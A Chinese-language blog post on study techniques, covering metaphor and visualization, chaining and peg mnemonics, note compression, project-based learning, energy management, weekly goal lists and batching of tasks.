重复上述过程，检查比喻不恰当的地方。例如，雪中行走是线性的痕迹，而脑神经却是错综复杂的网络。 发现一个好的比喻是一个创造性的试验过程，这表示你在找到一个恰当的可以充当知识模型的比喻之前，可能会尝试好多个不太恰当的比喻。抓住跳入你脑海的第一个念头，看看这个念头哪里适合，哪里不适合，把不适合的部分改掉再看看。 你经常会碰到找到的比喻只是部分符合你要学的知识。建议你再找几个不同角度的比喻，这样做不仅会减少理解上的错误，而且会创造广泛的联系，从而改善结构的质量。 内在化 指不仅仅在脑海中出现图像，而且有声音、触觉和情感等。一般说来，一幅图就足够了，但是能够调动更多的感知与知识联系在一起，甚至与情感相连，得到的关联一定比单一的图像更强（即所谓强联系）。具体信息的内在化效果最好，而抽象信息最适合比喻法。当然了，二者之间尚有相当大的灰色地带。 有了脑海中的图像之后，就可以将其他感觉加入到图像中，假设你正在想象对光的感觉，想象光线进入眼睛时的那种感觉，你可能会进一步想象光线击中视网膜时和在视神经里汹涌前行时发出的那种特殊的声音。内在化还有一步就是赋予知识以情感，心理学家早就知道不同的情感状态会影响记忆的效果。将知识与情感（即使是很小的情感）相联系总是比干巴巴的知识更容易记得住。 1. 明确你要内在化的概念。这是一个生物过程，还是编程中的函数或者是一个数学概念？ 2. 从建立脑海中的图像开始。如果你不习惯内在化，可以先试着在纸上画出概念的粗略图，多次尝试后，你就会直接在脑海中想象了。 3. 脑海中的图像是静态的，还是栩栩如生的动态场景？掌握一个行列式需要好几个步骤，所以要让图像动起来，就仿佛在看一部电影一样。 4. 现在开始加上其他感官。试着用手去拿它，去摸它，去打开它，去嗅它的味道，去听它的声音，动用你身体的所有感官，将所有的感觉与运动的图像相联系。 5. 加入更多的感觉或情感。不断重复和优化图像，直到你一想到它就能很快地回忆起知识。 像比喻一样，内在化也是个创造性的试验过程。你不可能一开始就想出完美的图像来。重要的是开始去做，在不断地优化、抛弃图像中不适合的部分，最后你一定会得到一幅记忆深刻、栩栩如生的图像。 图表法 图表是内在化的简化。创作图表比想象一幅图像花费的时间更多，但是操作起来更容易，而且可以用于非常抽象的观点，抽象的观点一般难以想象。 学习时，图表技术也可以很容易地和笔记流技术以及积极阅读相结合。一幅图表就是一幅将多个信息压缩在一起的图画，图表最常见的形式是带有数字信息的图表。散点图可以将成百上千的数据点压缩到一张图中，流程图技术可以把一系列复杂的内部作用关系和步骤绘制到一幅图中，让人容易看明白。图表的唯一缺点就是它花费的时间要比比喻法和内在化更长。 联想法 将一系列观点串在一起，就像链条，一旦进入链条中的一环，就可以轻易地到达链条中的其他环节。 联想法在处理一系列随意信息时效果很好，包含步骤的过程信息、按顺序写下的名字或公式，都可以应用联想法。随着不断地练习，你可以迅速地将数十个知识点连在一起。 第一步，创造顺序。先在纸上写下你打算记住的很多信息，在你能理解的前提下，迅速地将信息分成几类。把要处理的信息罗列成一个线性的清单非常重要，因为这是用联想法保存数据的唯一方法。 第二步，给清单中的每一项设一个符号。如果清单中是抽象信息的话，你可以给每个抽象信息设计一个容易识别的符号。设计的符号要能迅速让你联想到原始的知识，因为联想法记住的是视觉符号，而不是抽象信息本身。 第三步，创建属于自己的联想。这一步是联想法的基础，你要做的就是创造生动夸张的图像，能将序列中的两个符号联系在一起，这表示你需要创造出图像联系1和2、2和3以及3和4，等等。 最好的联想法是通过同类科目的知识进行串联，例如：考研政治，中共一大有什么意义，到了二大有什么意义，三大，四大...。联想法的结果可以被图表法或者思维导图利用，形成更有画面感和逻辑性的记忆。 挂钩法 挂钩法类似于联想法。利用挂钩系统，你可以将要记忆的信息与数字联系在一起，所以即使这些信息并不是按照特殊顺序排列，你也能回忆起每一个信息来。挂钩法对于记忆日期类的数字也是很有用的，挂钩法并不是将一系列观点互相联系在一起，而是将每一个观点与一个特殊的数字联系在一起。 挂钩法与联想法类似，只不过挂钩法不是将信息与前后知识点相连，而是将信息与具体0～12个数字联系一起。用这种方式记忆，如果其中一个联系破坏了，其他的联系还是很容易想起来的，只需要花点力气回忆你的数字挂钩系统。 高级挂钩法：高级挂钩法使用0～9的声音和数字0～9建立联系，而不是押韵的图像。 信息压缩技术 信息压缩的目标是减少信息的容量，寻找信息的逻辑关系，一般通过三种主要方式进行信息压缩：记忆术、图像联系以及笔记压缩法。 记忆术：用一个短语或单词来储存数个信息的方法。在急救术中，有一个处理动脉出血的记忆术RED，R:Rest暴露伤口，E:Elevate评估出血范围；D:Direct直接压迫，这种记忆术并没有什么新鲜的，古今中外都用了几个世纪。 图像联系：可以看作联想法和图表法或内在化的综合体，办法是把几个信息联系起来并且用一张图表来表示。 笔记压缩法：笔记压缩对于快速掌握大量材料是一个有用的办法。它可以作为应用其他信息压缩技术、联想法、挂钩法或其他整体性学习技术的起点。笔记压缩的目的就是将一大堆需要学习的知识减少至几页笔记。 压缩笔记的步骤： 1. 拿几张空白纸。准备好要压缩的笔记，这个练习可能会花费一两小时，所以要确保你有这么多时间。 2. 用最小的字，写下笔记中的主要观点。使用尽可能少的字。 3. 接着写下与之相联系的观点、公式、概念或定义。尽可能写小一点和写少一点，节省空间。 4. 持续上述自由写下观点的过程，直到将笔记中的每一个主要观点都写了下来为止。最后你得到大约1～3张密密麻麻写满信息的纸。 5. 有时候，还可以更进一步，将上面压缩后的内容加工、修饰得更有条理，更好看一些。 实际应用 要深入拓展你在课堂上学到的知识，最好的办法就是将知识应用到实际生活中去。 模型纠错 模型纠错实际上就是实践的代名词：不断地练习和实践，在实践中发现问题，测试自己是整体性学习过程中纠错的唯一手段。 你不可能只看看程序，就知道错在哪里，只有亲自上机跑一跑，才知道问题出在哪里。同样的道理，大脑中的错误也需要通过测验、解决问题以及完成作业来纠正。 以项目为基础的学习 以项目为基础的学习方式简单地说就是设定一个需要1～3个月达成的目标，达成目标的过程就是学习的过程，达成了目标也就达到了学习的效果。为了完成项目，你必须围绕着目标努力学习，以项目为基础的学习符合整体性学习的每一个过程。 创造一个有意义的目标。仅仅有一个项目还不够，我发现只有项目完成后有一个清晰的目标时，学习才更为主动，热情更高。假如项目不仅是为了学习而设立的，项目本身具有的意义会激发你的热情，并使你为着目标而持续地努力工作，不断学习。 回顾 理论和技术是整体性学习策略中同等重要的两个部分。 这些技术只是学习策略中很小的一部分，寻找更多的学习方法，并整合到自己的学习策略中去，通过不断地整合和实践，最终找到适合你自己的学习理论和策略。实践对于应用这些整体性学习方法至关重要。 高效率的要点 能量管理 良好的能量管理有两步：增加能量储备。将你的日程表由线性的改为循环式的。 增加能量储备：运动，良好的睡眠，水，理想的饮食应该是少吃多餐，一天吃四五餐，每次吃七分饱，这样可以保证你一天内的营养供应持续稳定，睡前吃一点能让你第二天早上精力充沛。 循环式作息计划：定时休息，比如双休。晚上不干活儿，将精力消耗集中在白天。设定小时（半小时，一个半小时）为基础单位的时间份额分配。 认知心理学指出，睡觉时大脑会自动回顾和梳理白天所学的知识，一遍遍加深和巩固知识间的神经联结。而且睡觉可以「修剪」你的记忆，稳固你背的那些知识。 不要"学习" 学习不是指坐在书桌前12个小时，也不是指每天坚持看书。这些是学习的表象，不是学习的实质。狭义的学习只是发生在学习者脑子里面的变化，所以学习可以表现为各种各样的具体活动，而枯坐在书桌前的苦读可能是最不像样的学习活动了。 学习的过程也意味着一系列的具体活动，比如阅读、做作业、记笔记、比喻、写文章、写日记、做练习、搞科研等都是学习，最为关键的是任何一种学习都要坚持深入下去，要寻根问底，打破砂锅问到底，要不断地问自己为什么。做科研是这样，读书也是这样。 绝不拖延 &amp; 建立良好的习惯 &amp; 设置学习目标 每周周末，列一个清单，包括所有的任务、作业以及你想在下周完成的读书和学习活动。 除非在一周内出现意想不到的事情，否则你就有责任完成这个清单，不过也不必超过清单所规定的任务。这样做就把无限的工作分割成在一周内可以完成的子任务。如果这一周特别忙碌，你可能会推迟完成任务。如果这一周很清闲，你可能会提前完成任务。 每天晚上，检查周计划，然后将每周的工作分配到每一天，确保完成每日的工作清单，但是不必超过它。 周/日目标系统有什么好处？ 1. 可以缓解你作决策的应激。你只需检查清单，就明白是否完成。 2. 防止你做一项大任务时耽搁不前，依赖每周和每日目标清单，而不是截止日期，你会有时间紧迫感。 3. 帮助分配你的工作量。通过制订计划，你可以将工作适当分配到周和日，不需要考试前熬通宵而前三周一个字不看，你可以细分工作。 每日阅读。每日练习。每日目标。先坚持30天，然后继续下去，就能养成习惯。 自我教育中可能碰到的最大问题就是缺乏系统安排、没有目标、缺少计划和方向。尽管这种松散的模式容易让你拓展所学的知识，而不是只掌握老师教你那点东西，不过，这也使得自学过程难以坚持长久。没有学校有计划的教学安排，自学需要学习者强大的内在自我约束机制，方能保证自己跨过一个又一个的障碍，可以记录学习过程来进行回顾。 批处理 批处理的意思就是将那些类似的、散在的工作集中起来一次做完。批处理有助于节省时间，因为你可以集中时间和精力。 在家庭作业和写作之间，我经常使用批处理。我会集中在某个时间把一周需要阅读的材料一次性读完，而抽出另外一个时间连续写三四篇文章。 就像多线程cpu，不断改变现在正在做的事就像cpu不断切换线程一样，状态的转换是需要时间的。]]></content>
      <categories>
        <category>Self</category>
      </categories>
      <tags>
        <tag>学习方法</tag>
      </tags>
  </entry>
</search>
